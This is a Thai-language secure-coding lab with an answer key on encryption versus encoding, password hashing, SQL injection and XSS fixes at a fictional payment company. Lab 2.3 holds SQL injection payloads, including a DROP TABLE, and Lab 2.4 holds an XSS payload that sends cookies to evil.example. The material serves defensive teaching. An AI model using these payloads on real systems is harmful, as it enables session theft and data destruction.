# Lab — Intermediate: Crypto ที่ถูกงาน และกัน Injection

> **คำแนะนำ:** ทำด้วยตัวเองก่อนเปิดเฉลย
> ห้ามทดสอบ payload โจมตีกับระบบที่คุณไม่มีสิทธิ์ — ใช้เฉพาะสภาพแวดล้อมแล็บ

---

## สถานการณ์จำลอง

บริษัท **"PayLeaf"** มีเว็บโอนเงินขนาดเล็ก ทีมเจอปัญหาหลัง audit ภายใน:

1. เก็บเลขบัญชีใน DB เป็น Base64 แล้วบอกว่า "encrypted แล้ว"
2. เก็บรหัสผ่านด้วย `SHA-256(password)` ไม่มี salt
3. Endpoint ค้นหาผู้ใช้ต่อ string SQL จาก query parameter `q`
4. หน้าโปรไฟล์แสดง `displayName` ดิบ ๆ ใน HTML
5. API บางส่วนยังเป็น HTTP ภายใน VPC แล้วทีมบอกว่า "อยู่ภายในแล้ว ไม่เป็นไร"

---

## Lab 2.1 — จัดประเภทกลไกให้ถูก

### โจทย์

สำหรับแต่ละความต้องการ เลือกกลไกที่ถูกต้องพร้อมเหตุผลสั้น ๆ:

| ความต้องการ                             | Encoding / Hash / HMAC / Encrypt / Password-KDF | เหตุผล |
| --------------------------------------- | ----------------------------------------------- | ------ |
| ซ่อนเลขบัญชีใน DB                       |                                                 |        |
| ตรวจว่าไฟล์ backup ถูกแก้หรือไม่        |                                                 |        |
| เก็บรหัสผ่านผู้ใช้                      |                                                 |        |
| ส่งรูป binary ใน JSON                   |                                                 |        |
| ตรวจว่า webhook body มาจาก partner จริง |                                                 |        |

### เกณฑ์ผ่าน

- [ ] เลือกถูกอย่างน้อย 4 จาก 5
- [ ] อธิบายได้ว่าทำไม Base64 ไม่ใช่ encryption

---

## Lab 2.2 — ออกแบบ Data at Rest สำหรับเลขบัญชี

### โจทย์

ออกแบบ module encrypt/decrypt ด้วย AES-256-GCM ตามแนว `src/crypto/aes-gcm.ts`:

- สร้าง `encryptAccountNumber(plain, key)` / `decryptAccountNumber(payload, key)`
- IV ต้องสุ่มใหม่ทุกครั้ง
- แสดงว่าถ้าแก้ ciphertext แล้ว decrypt ต้องล้มเหลว

ตอบเพิ่ม:

1. คีย์ควรเก็บที่ไหนใน production?
2. จะใช้ RSA ช่วยตรงจุดไหนใน hybrid model?

### เกณฑ์ผ่าน

- [ ] encrypt/decrypt ทำงานได้
- [ ] tamper test ล้มเหลวตามที่คาด
- [ ] อธิบายที่เก็บคีย์ได้สมเหตุสมผล (KMS / secret manager)

---

## Lab 2.3 — แก้ SQL Injection ในช่องค้นหา

### โจทย์

โค้ดเดิม (จำลอง):

```ts
function searchUsers(q: string): string {
  return `SELECT id, email FROM users WHERE email LIKE '%${q}%'`;
}
```

ให้เขียน version ปลอดภัยด้วย parameterized query
และออกแบบ allowlist ถ้ามี `sort` จากผู้ใช้

Payload ที่ต้องกันได้ในแง่แนวคิด:

- `' OR '1'='1`
- `x'; DROP TABLE users;--`

### เกณฑ์ผ่าน

- [ ] ไม่มีการต่อ string ค่าจากผู้ใช้เข้า SQL ดิบ
- [ ] มีตัวอย่าง `QueryParts { text, params }`
- [ ] อธิบาย PoLP ของ DB user ประกอบ

---

## Lab 2.4 — กัน XSS ที่ displayName

### โจทย์

ผู้ใช้ตั้งชื่อเป็น:

```html
<img src="x" onerror="fetch('https://evil.example/steal?c='+document.cookie)" />
```

ให้:

1. ใช้ `escapeHtml` / `sanitizeDisplayName` ให้ปลอดภัยเมื่อเรนเดอร์เป็น HTML text
2. ระบุ control ชั้นอื่นเพิ่มอย่างน้อย 2 อย่าง (Defense in Depth)

### เกณฑ์ผ่าน

- [ ] ชื่อที่ sanitize แล้วไม่มี tag ที่รันได้
- [ ] กล่าวถึง HttpOnly cookie และ/หรือ CSP

---

## Lab 2.5 — Sensitive Data Exposure Review

### โจทย์

เขียน findings จากสถานการณ์ PayLeaf เป็นตาราง:

| Finding | ความรุนแรง (Low/Med/High) | เสา CIA | แนวทางแก้ |
| ------- | ------------------------- | ------- | --------- |

ต้องครอบคลุมอย่างน้อย: Base64-as-encryption, SHA-256 passwords, HTTP ภายใน, SQL search, XSS profile

### เกณฑ์ผ่าน

- [ ] มี ≥ 5 findings
- [ ] แต่ละข้อมีแนวทางแก้ที่ทำได้จริง

---

# เฉลย

<details>
<summary><strong>เฉลย Lab 2.1</strong></summary>

| ความต้องการ        | กลไก                           | เหตุผล                                      |
| ------------------ | ------------------------------ | ------------------------------------------- |
| ซ่อนเลขบัญชีใน DB  | Encrypt (AES-GCM)              | ต้องถอดกลับเมื่อมีสิทธิ์ และกันอ่านจาก disk |
| ตรวจ backup ถูกแก้ | Hash / HMAC                    | ต้องการ integrity ไม่ใช่ความลับ             |
| เก็บรหัสผ่าน       | Password-KDF (Argon2id/bcrypt) | one-way + salt + cost                       |
| ส่งรูปใน JSON      | Encoding (Base64)              | แปลงรูปแบบ ไม่ใช่ความปลอดภัย                |
| ตรวจ webhook       | HMAC                           | ยืนยันผู้ส่งด้วย shared secret              |

Base64 เป็น encoding — decode ได้ทันทีโดยไม่มีคีย์ จึงไม่ใช่ encryption

</details>

<details>
<summary><strong>เฉลย Lab 2.2</strong></summary>

ใช้ `encryptAesGcm` / `decryptAesGcm` จาก `src/crypto/aes-gcm.ts`
คีย์ production: AWS KMS / GCP KMS / HashiCorp Vault / cloud secret manager
RSA: ใช้ห่อ (wrap) AES data key ต่อไฟล์/ต่อ tenant ตาม `src/crypto/rsa-hybrid.ts`

โครงสร้างแนะนำ:

```
lab/your-solution/
├── account-crypto.ts
└── tamper-test.ts
```

</details>

<details>
<summary><strong>เฉลย Lab 2.3</strong></summary>

```ts
function searchUsersSafe(q: string): QueryParts {
  return {
    text: 'SELECT id, email FROM users WHERE email LIKE $1',
    params: [`%${q}%`],
  };
}
```

แม้ `q` จะมี `'` หรือ `;` ก็เป็นแค่ข้อมูลใน parameter
เสริม: DB user ของแอปไม่มีสิทธิ์ `DROP TABLE` (PoLP)

ดูแนว allowlist ใน `src/injection/sql-safe.ts`

</details>

<details>
<summary><strong>เฉลย Lab 2.4</strong></summary>

`sanitizeDisplayName` จะ escape `<`, `>`, `"` ฯลฯ ทำให้กลายเป็นข้อความธรรมดา
Control เสริม:

1. `Content-Security-Policy: default-src 'self'; script-src 'self'`
2. Cookie session เป็น `HttpOnly; Secure; SameSite=Lax`
3. ใช้ framework ที่ escape โดย default

</details>

<details>
<summary><strong>เฉลย Lab 2.5</strong></summary>

| Finding                     | Severity | CIA             | แก้                   |
| --------------------------- | -------- | --------------- | --------------------- |
| Base64 แทน encryption       | High     | C               | AES-GCM + KMS         |
| SHA-256 password ไม่มี salt | High     | C               | Argon2id/bcrypt       |
| HTTP ภายใน VPC              | Med–High | C               | mTLS / TLS ภายใน      |
| SQL string concat           | High     | C/I             | parameterized queries |
| displayName ดิบใน HTML      | High     | C (session) / I | escape + CSP          |

</details>

---

## โครงสร้างไฟล์เฉลยโดยสรุป

```
02-intermediate/
├── README.md
├── LAB.md
└── src/
    ├── index.ts
    ├── crypto/aes-gcm.ts
    ├── crypto/rsa-hybrid.ts
    ├── hashing/hash-vs-encode.ts
    ├── sanitization/sanitize.ts
    └── injection/sql-safe.ts
```
